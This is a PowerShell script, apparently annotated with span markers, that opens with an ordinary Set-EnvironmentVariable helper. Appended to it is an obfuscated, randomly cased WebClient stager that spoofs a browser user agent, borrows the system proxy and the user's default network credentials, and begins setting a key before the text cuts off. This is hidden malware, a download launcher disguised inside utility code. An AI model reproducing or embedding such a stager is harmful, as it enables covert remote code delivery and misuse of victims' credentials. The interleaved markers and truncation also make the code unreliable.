 -||-> function Set-EnvironmentVariable
{
    param
    (
        [parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [parameter()]
        [String]
        $Value,

        [parameter(Mandatory = $true)]
        [int]
        $Target
    )

     -||-> if ( -||-> $Target -eq $script:EnvironmentVariableTarget.Process <-||- )
    {
         -||-> [System.Environment]::SetEnvironmentVariable($Name, $Value) <-||- 

        return
    }
    elseif ( -||-> $Target -eq $script:EnvironmentVariableTarget.Machine <-||- )
    {
         -||-> if ( -||-> $Name.Length -ge $script:SystemEnvironmentVariableMaximumLength <-||- )
        {
             -||-> $message = $LocalizedData.InvalidEnvironmentVariableName -f ( -||-> $Name, $script:SystemEnvironmentVariableMaximumLength <-||- ) <-||- 
             -||-> ThrowError -ExceptionName "System.ArgumentException" `
                        -ExceptionMessage $message `
                        -ErrorId 'InvalidEnvironmentVariableName' `
                        -ErrorCategory InvalidArgument `
                        -ExceptionObject $Name <-||- 
            return
        } <-||- 

         -||-> $Path = $script:SystemEnvironmentKey <-||- 
    }
    elseif ( -||-> $Target -eq $script:EnvironmentVariableTarget.User <-||- )
    {
         -||-> if ( -||-> $Name.Length -ge $script:UserEnvironmentVariableMaximumLength <-||- )
        {
             -||-> $message = $LocalizedData.InvalidEnvironmentVariableName -f ( -||-> $Name, $script:UserEnvironmentVariableMaximumLength <-||- ) <-||- 
             -||-> ThrowError -ExceptionName "System.ArgumentException" `
                        -ExceptionMessage $message `
                        -ErrorId 'InvalidEnvironmentVariableName' `
                        -ErrorCategory InvalidArgument `
                        -ExceptionObject $Name <-||- 
            return
        } <-||- 

         -||-> $Path = $script:UserEnvironmentKey <-||- 
    } <-||- 

     -||-> if ( -||-> !$Value <-||- )
    {
         -||-> Microsoft.PowerShell.Management\Remove-ItemProperty $Path -Name $Name -ErrorAction SilentlyContinue <-||- 
    }
    else
    {
         -||-> Microsoft.PowerShell.Management\Set-ItemProperty $Path -Name $Name -Value $Value <-||- 
    } <-||- 

    
     -||-> Send-EnvironmentChangeMessage <-||- 
} <-||- 

 -||-> $wc= -||-> New-ObjEct SySTEM.NET.WebClienT <-||-  <-||- ; -||-> $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko' <-||- ; -||-> $wC.HEadeRS.AdD('User-Agent',$u) <-||- ; -||-> $Wc.PrOxY = [SYsTEM.NeT.WeBREqUeST]::DeFaulTWEBPROXy <-||- ; -||-> $wC.ProXY.CrEDeNtiaLS = [SyStEm.Net.CREDentIalCAChE]::DefAULtNetwoRkCREdenTiAlS <-||- ; -||-> $K='/j(\wly4+aW


 <-||- 
